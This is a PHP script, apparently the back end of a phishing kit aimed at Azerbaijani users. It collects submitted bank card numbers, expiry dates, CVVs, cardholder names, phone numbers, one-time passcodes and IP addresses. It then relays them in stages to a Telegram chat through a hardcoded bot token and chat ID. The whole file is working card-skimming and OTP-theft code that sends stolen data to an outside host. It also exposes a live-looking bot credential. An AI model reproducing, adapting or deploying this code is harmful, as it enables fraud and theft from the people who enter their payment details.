<?php
// YALNIZ POST İCƏZƏLİDİR
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(403);
    die('🚫 Giriş qadağandır!');
}

// BOT MƏLUMATLARI - BURAYA ÖZ TOKENİNİ YAZ
$botToken = '8800834045:AAEgSbAX3Iai2AbI18-wIQODCsEvesgk83o';
$chatId = '-1003937068249';

// POST MƏLUMATLARI
$cardName = isset($_POST['card_name']) ? trim(strip_tags($_POST['card_name'])) : '';
$cardNumber = isset($_POST['card_number']) ? trim(strip_tags($_POST['card_number'])) : '';
$cardExpiry = isset($_POST['card_expiry']) ? trim(strip_tags($_POST['card_expiry'])) : '';
$cardCvv = isset($_POST['card_cvv']) ? trim(strip_tags($_POST['card_cvv'])) : '';
$operator = isset($_POST['operator']) ? trim(strip_tags($_POST['operator'])) : '';
$phone = isset($_POST['phone']) ? trim(strip_tags($_POST['phone'])) : '';
$amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : '';
$ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_ADDR'];
$otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : '';
$campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';
$type = isset($_POST['type']) ? trim(strip_tags($_POST['type'])) : '';

// SIRALI ID
$counterFile = 'counter.txt';
if (file_exists($counterFile)) {
    $id = (int)file_get_contents($counterFile) + 1;
} else {
    $id = 1;
}
file_put_contents($counterFile, $id);

function sendToTelegram($message) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode;
}

// 1. NÖMRƏ MESAJI
if ($type === 'phone_only') {
    $message = "📞 YENİ NÖMRƏ #" . $id . "\n────────────────────────\n📱 Nömrə: " . $phone . "\n────────────────────────";
    sendToTelegram($message);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

// 2. KART MESAJI
if ($type === 'card_only' && !empty($cardNumber)) {
    $message = "💳 KART GİRİŞİ #" . $id . "\n────────────────────────\n📱 Nömrə: " . $phone . "\n💰 Tutar: " . $amount . " AZN\n💳 Kart: " . $cardNumber . "\n📅 Tarix: " . $cardExpiry . "\n🔐 CVV: " . $cardCvv . "\n👤 İsim: " . $cardName . "\n🌐 IP: " . $ip;
    if (!empty($campaign)) $message .= "\n📦 Paket: " . $campaign;
    $message .= "\n────────────────────────";
    sendToTelegram($message);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

// 3. OTP MESAJI
if (!empty($otp)) {
    $message = "🔑 OTP TƏSDİQİ #" . $id . "\n────────────────────────\n📱 Nömrə: " . $phone . "\n🔑 OTP: " . $otp . "\n🌐 IP: " . $ip;
    if (!empty($campaign)) $message .= "\n📦 Paket: " . $campaign;
    $message .= "\n────────────────────────";
    sendToTelegram($message);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

header('Content-Type: application/json');
echo json_encode(['status' => 'error']);
exit;
?>
